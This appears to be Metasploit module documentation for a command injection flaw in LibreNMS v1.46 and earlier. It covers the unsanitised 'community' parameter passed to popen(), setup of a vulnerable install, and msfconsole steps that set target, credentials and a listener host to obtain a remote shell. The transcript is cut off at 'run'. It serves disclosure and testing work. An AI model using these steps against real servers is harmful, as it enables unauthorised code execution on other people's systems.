## Description
  
  In LibreNMS `v1.46` and below, there exists a command injection vulnerability in `capture.inc.php`.
  The vulnerable functionality is intended to run a command such as `snmpwalk` and save the output as
  a file. The `community` parameter is an unsanitized parameter retrieved through a POST request to `addhost`,
  and it is used to build the command that is executed in the `capture.inc.php` functionality. The final command
  is passed to the `popen()` function, which results in execution of arbitrary code.

  This module has been tested on LibreNMS `v1.46` and `v1.45`.

## Vulnerable Application

  A vulnerable version of LibreNMS for Ubuntu can be installed using the instructions [here](https://docs.librenms.org/Installation/Installation-Ubuntu-1804-Apache/).
  In the command `composer create-project --no-dev --keep-vcs librenms/librenms librenms dev-master`, replace `dev-master`
  with a vulnerable version of the software, ex: `1.46`.

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: ```use exploit/linux/http/librenms_cmd_injection```
  4. Do: ```set RHOSTS <ip>```
  5. Do: ```set USERNAME <user>```
  6. Do: ```set PASSWORD <pass>```
  7. Do: ```run```
  8. You should get a shell.

## Scenarios

### Tested on LibreNMS 1.46 on Ubuntu 18.04

  ```
  msf5 > use exploit/linux/http/librenms_cmd_injection
  msf5 exploit(linux/http/librenms_cmd_injection) > set rhosts 192.168.37.143
  rhosts => 192.168.37.143
  msf5 exploit(linux/http/librenms_cmd_injection) > set username blah
  username => blah
  msf5 exploit(linux/http/librenms_cmd_injection) > set password password
  password => password
  msf5 exploit(linux/http/librenms_cmd_injection) > set lhost 192.168.37.1
  lhost => 192.168.37.1
  msf5 exploit(linux/http/librenms_cmd_injection) > run
